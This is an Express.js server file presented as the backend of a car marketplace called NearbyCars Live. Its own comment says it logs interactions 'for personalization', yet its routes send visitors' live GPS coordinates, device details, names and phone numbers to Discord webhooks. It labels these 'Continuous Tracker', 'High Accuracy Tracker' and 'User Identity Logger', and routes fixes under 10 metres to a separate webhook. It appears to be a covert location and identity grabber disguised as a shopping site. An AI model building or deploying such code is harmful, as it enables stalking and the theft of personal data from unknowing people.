/**
 * ============================================
 * NearbyCars Live - Express Backend Server
 * ============================================
 * A car marketplace backend that handles:
 * - Serving static frontend files
 * - Proxying Discord webhook notifications
 * - Optional OTP verification via MessageCentral
 * - Logging user interactions for personalization
 */

require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ─── Middleware ───────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ─── Discord Webhook Helper ──────────────────
/**
 * Sends a rich Discord embed to the specified webhook URL.
 * @param {string} webhookUrl - The Discord webhook URL
 * @param {object} embed - The embed object following Discord's embed structure
 * @returns {Promise<object>} - Axios response
 */
async function sendDiscordEmbed(webhookUrl, embed) {
  if (!webhookUrl || webhookUrl.includes('YOUR_WEBHOOK')) {
    console.log('[Webhook] Skipped - URL not configured');
    return { skipped: true };
  }

  try {
    const payload = {
      username: 'NearbyCars Live',
      avatar_url: 'https://img.icons8.com/fluency/96/car.png',
      embeds: [embed]
    };

    const response = await axios.post(webhookUrl, payload, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 10000
    });

    console.log(`[Webhook] Sent to ${webhookUrl.split('/webhooks/')[1]?.split('/')[0] || 'webhook'}`);
    return response.data;
  } catch (error) {
    console.error(`[Webhook Error] ${error.message}`);
    return { error: error.message };
  }
}

// ─── Routes ──────────────────────────────────

/**
 * GET / - Serve the main page
 */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

/**
 * POST /api/webhook/location
 * Receives location data from the frontend and dispatches to appropriate webhooks.
 *
 * Logic:
 * - ALWAYS sends to WEBHOOK_URL (Webhook 1) for continuous live tracking
 * - If accuracy < 10 meters, also sends to WEBHOOK_URL_2 (Webhook 2) with device info
 *
 * Body: { latitude, longitude, accuracy, deviceName, deviceModel, userAgent, timestamp }
 */
app.post('/api/webhook/location', async (req, res) => {
  try {
    const { latitude, longitude, accuracy, deviceName, deviceModel, userAgent, timestamp } = req.body;

    // Validate required fields
    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, message: 'Latitude and longitude are required' });
    }

    const accuracyVal = parseFloat(accuracy) || 0;
    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const now = timestamp ? new Date(timestamp).toISOString() : new Date().toISOString();
    const deviceInfo = deviceName || deviceModel
      ? `${deviceName || 'Unknown'} ${deviceModel ? '(' + deviceModel + ')' : ''}`.trim()
      : 'Unknown Device';

    // ── Webhook 1: Always send (continuous tracking) ──
    const embed1 = {
      title: '📍 Location Update',
      description: 'A user\'s location has been updated.',
      color: parseInt(process.env.EMBED_COLOR) || 15844367,
      fields: [
        { name: '🧭 Coordinates', value: `**Lat:** ${latitude}\n**Lng:** ${longitude}`, inline: true },
        { name: '🎯 Accuracy', value: `~${accuracyVal.toFixed(1)} meters`, inline: true },
        { name: '📱 Device', value: deviceInfo, inline: true },
        { name: '🗺️ Map Link', value: `[View on Google Maps](${mapLink})`, inline: false },
        { name: '🕐 Timestamp', value: `<t:${Math.floor(new Date(now).getTime() / 1000)}:R>`, inline: true }
      ],
      footer: { text: 'NearbyCars Live • Continuous Tracker' },
      timestamp: now
    };

    await sendDiscordEmbed(process.env.WEBHOOK_URL, embed1);

    // ── Webhook 2: High accuracy only (< 10 meters) ──
    if (accuracyVal > 0 && accuracyVal < 10 && process.env.WEBHOOK_URL_2) {
      const embed2 = {
        title: '🎯 High Accuracy Location',
        description: 'Precise location captured (accuracy < 10m). Device info included.',
        color: parseInt(process.env.EMBED_COLOR_HIGH) || 3066993,
        fields: [
          { name: '🧭 Coordinates', value: `**Lat:** ${latitude}\n**Lng:** ${longitude}`, inline: true },
          { name: '🎯 Accuracy', value: `**${accuracyVal.toFixed(1)} meters** ✅`, inline: true },
          { name: '📱 Device Name', value: deviceName || 'N/A', inline: true },
          { name: '💻 Device Model', value: deviceModel || 'N/A', inline: true },
          { name: '🌐 User Agent', value: `\`\`\`${(userAgent || 'Unknown').substring(0, 200)}\`\`\``, inline: false },
          { name: '🗺️ Map Link', value: `[View on Google Maps](${mapLink})`, inline: false },
          { name: '🕐 Timestamp', value: `<t:${Math.floor(new Date(now).getTime() / 1000)}:R>`, inline: true }
        ],
        footer: { text: 'NearbyCars Live • High Accuracy Tracker' },
        timestamp: now
      };

      await sendDiscordEmbed(process.env.WEBHOOK_URL_2, embed2);
    }

    res.json({ success: true, message: 'Location processed', highAccuracy: accuracyVal < 10 });
  } catch (error) {
    console.error('[Location Webhook Error]', error.message);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

/**
 * POST /api/webhook/name
 * Receives user name along with location and dispatches to name-specific webhooks.
 *
 * Logic:
 * - If name + location available → send to WEBHOOK_URL_3 (Webhook 3)
 * - If name + high accuracy (< 10m) → also send to WEBHOOK_URL_4 (Webhook 4)
 *
 * Body: { name, latitude, longitude, accuracy, deviceName, deviceModel, userAgent, timestamp }
 */
app.post('/api/webhook/name', async (req, res) => {
  try {
    const { name, latitude, longitude, accuracy, deviceName, deviceModel, userAgent, timestamp } = req.body;

    if (!name || latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, message: 'Name, latitude, and longitude are required' });
    }

    const accuracyVal = parseFloat(accuracy) || 0;
    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const now = timestamp ? new Date(timestamp).toISOString() : new Date().toISOString();

    // ── Webhook 3: Name + Location ──
    const embed3 = {
      title: '👤 User Identified',
      description: `User **${name}** has shared their details.`,
      color: parseInt(process.env.EMBED_COLOR_NAME) || 3447003,
      fields: [
        { name: '📛 Name', value: name, inline: true },
        { name: '🧭 Location', value: `[${latitude}, ${longitude}](${mapLink})`, inline: true },
        { name: '🎯 Accuracy', value: `~${accuracyVal.toFixed(1)} meters`, inline: true },
        { name: '📱 Device', value: `${deviceName || 'Unknown'} ${deviceModel || ''}`.trim(), inline: true },
        { name: '🕐 Timestamp', value: `<t:${Math.floor(new Date(now).getTime() / 1000)}:R>`, inline: true }
      ],
      footer: { text: 'NearbyCars Live • User Identity Logger' },
      timestamp: now
    };

    await sendDiscordEmbed(process.env.WEBHOOK_URL_3, embed3);

    // ── Webhook 4: Name + High Accuracy Location ──
    if (accuracyVal > 0 && accuracyVal < 10 && process.env.WEBHOOK_URL_4) {
      const embed4 = {
        title: '👤 Verified User + Precise Location',
        description: `User **${name}** with high-accuracy GPS fix.`,
        color: parseInt(process.env.EMBED_COLOR_OTP) || 10181039,
        fields: [
          { name: '📛 Name', value: name, inline: true },
          { name: '🧭 Coordinates', value: `**${latitude}, ${longitude}**`, inline: true },
          { name: '🎯 Accuracy', value: `**${accuracyVal.toFixed(1)}m** ✅`, inline: true },
          { name: '📱 Device', value: `${deviceName || 'Unknown'} ${deviceModel || ''}`.trim(), inline: true },
          { name: '🌐 User Agent', value: `\`\`\`${(userAgent || 'Unknown').substring(0, 200)}\`\`\``, inline: false },
          { name: '🗺️ Map', value: `[Google Maps](${mapLink})`, inline: false },
          { name: '🕐 Time', value: `<t:${Math.floor(new Date(now).getTime() / 1000)}:R>`, inline: true }
        ],
        footer: { text: 'NearbyCars Live • Verified + Precise' },
        timestamp: now
      };

      await sendDiscordEmbed(process.env.WEBHOOK_URL_4, embed4);
    }

    res.json({ success: true, message: 'Name logged successfully' });
  } catch (error) {
    console.error('[Name Webhook Error]', error.message);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

/**
 * POST /api/webhook/otp
 * Logs successful OTP verification to Discord.
 *
 * Body: { name, mobile, latitude, longitude, accuracy }
 */
app.post('/api/webhook/otp', async (req, res) => {
  try {
    const { name, mobile, latitude, longitude, accuracy } = req.body;

    if (!name || !mobile) {
      return res.status(400).json({ success: false, message: 'Name and mobile are required' });
    }

    const mapLink = (latitude && longitude)
      ? `https://www.google.com/maps?q=${latitude},${longitude}`
      : null;

    const embed = {
      title: '✅ Mobile Verified',
      description: `User **${name}** has verified their mobile number.`,
      color: parseInt(process.env.EMBED_COLOR_OTP) || 10181039,
      fields: [
        { name: '📛 Name', value: name, inline: true },
        { name: '📱 Mobile', value: `\`+${mobile}\``, inline: true },
        { name: '🧭 Location', value: mapLink ? `[View Location](${mapLink})` : 'Not available', inline: true },
        { name: '🎯 Accuracy', value: accuracy ? `~${parseFloat(accuracy).toFixed(1)}m` : 'N/A', inline: true },
        { name: '🕐 Verified At', value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
      ],
      footer: { text: 'NearbyCars Live • OTP Verification Logger' },
      timestamp: new Date().toISOString()
    };

    // Send to Webhook 3 (primary user data webhook)
    await sendDiscordEmbed(process.env.WEBHOOK_URL_3, embed);

    res.json({ success: true, message: 'OTP verification logged' });
  } catch (error) {
    console.error('[OTP Webhook Error]', error.message);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

/**
 * POST /api/send-otp
 * Sends OTP via MessageCentral API.
 *
 * Body: { mobile }
 */
app.post('/api/send-otp', async (req, res) => {
  try {
    const { mobile } = req.body;
    const authToken = process.env.MC_AUTH_TOKEN;
    const deviceId = process.env.MC_DEVICE_ID;

    if (!authToken || !deviceId) {
      return res.status(503).json({
        success: false,
        message: 'OTP service not configured. Please set MC_AUTH_TOKEN and MC_DEVICE_ID in .env'
      });
    }

    if (!mobile || !/^\d{10,15}$/.test(mobile)) {
      return res.status(400).json({ success: false, message: 'Valid mobile number required (10-15 digits)' });
    }

    // MessageCentral API for sending OTP
    const response = await axios.get(
      `https://api.messagecentral.in/send-otp?mobileNumber=${mobile}&templateId=verified&authKey=${authToken}&deviceId=${deviceId}`
    );

    console.log(`[OTP] Sent to ${mobile.substring(0, 3)}****${mobile.slice(-2)}`);
    res.json({ success: true, data: response.data });
  } catch (error) {
    console.error('[OTP Send Error]', error.response?.data || error.message);
    res.status(500).json({
      success: false,
      message: error.response?.data?.message || 'Failed to send OTP'
    });
  }
});

/**
 * POST /api/verify-otp
 * Verifies OTP via MessageCentral API.
 *
 * Body: { mobile, otp }
 */
app.post('/api/verify-otp', async (req, res) => {
  try {
    const { mobile, otp } = req.body;
    const authToken = process.env.MC_AUTH_TOKEN;
    const deviceId = process.env.MC_DEVICE_ID;

    if (!authToken || !deviceId) {
      return res.status(503).json({
        success: false,
        message: 'OTP service not configured'
      });
    }

    if (!mobile || !otp) {
      return res.status(400).json({ success: false, message: 'Mobile and OTP are required' });
    }

    // MessageCentral API for verifying OTP
    const response = await axios.get(
      `https://api.messagecentral.in/verify-otp?mobileNumber=${mobile}&templateId=verified&authKey=${authToken}&deviceId=${deviceId}&otp=${otp}`
    );

    const verified = response.data?.status === 'verified' || response.data?.data?.status === 'verified';

    if (verified) {
      console.log(`[OTP] Verified ${mobile.substring(0, 3)}****${mobile.slice(-2)}`);
      res.json({ success: true, verified: true, message: 'OTP verified successfully' });
    } else {
      res.json({ success: true, verified: false, message: 'Invalid OTP. Please try again.' });
    }
  } catch (error) {
    console.error('[OTP Verify Error]', error.response?.data || error.message);
    res.status(500).json({
      success: false,
      message: error.response?.data?.message || 'Failed to verify OTP'
    });
  }
});

/**
 * POST /api/order
 * Handles car order inquiries.
 *
 * Body: { name, mobile, carId, carModel, location }
 */
app.post('/api/order', async (req, res) => {
  try {
    const { name, mobile, carId, carModel, location } = req.body;

    console.log(`[Order] New inquiry: ${carModel} by ${name} (${mobile || 'No mobile'})`);

    // Send order notification to Webhook 3
    if (process.env.WEBHOOK_URL_3) {
      const embed = {
        title: '🚗 New Car Order Inquiry',
        description: `A user is interested in **${carModel}**`,
        color: 15105570, // Orange
        fields: [
          { name: '📛 Customer', value: name || 'Not provided', inline: true },
          { name: '📱 Mobile', value: mobile || 'Not provided', inline: true },
          { name: '🚘 Car Model', value: carModel || 'Unknown', inline: true },
          { name: '📍 Location', value: location || 'Not shared', inline: true },
          { name: '🕐 Time', value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
        ],
        footer: { text: 'NearbyCars Live • Order Inquiry' },
        timestamp: new Date().toISOString()
      };

      await sendDiscordEmbed(process.env.WEBHOOK_URL_3, embed);
    }

    res.json({ success: true, message: 'Order inquiry received! A dealer will contact you soon.' });
  } catch (error) {
    console.error('[Order Error]', error.message);
    res.status(500).json({ success: false, message: 'Failed to process order' });
  }
});

// ─── 404 Handler ─────────────────────────────
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ─── Start Server ────────────────────────────
app.listen(PORT, () => {
  console.log(`
  ╔══════════════════════════════════════════╗
  ║   🚗 NearbyCars Live - Server Running   ║
  ║   📍 http://localhost:${PORT}              ║
  ╚══════════════════════════════════════════╝
  `);
});
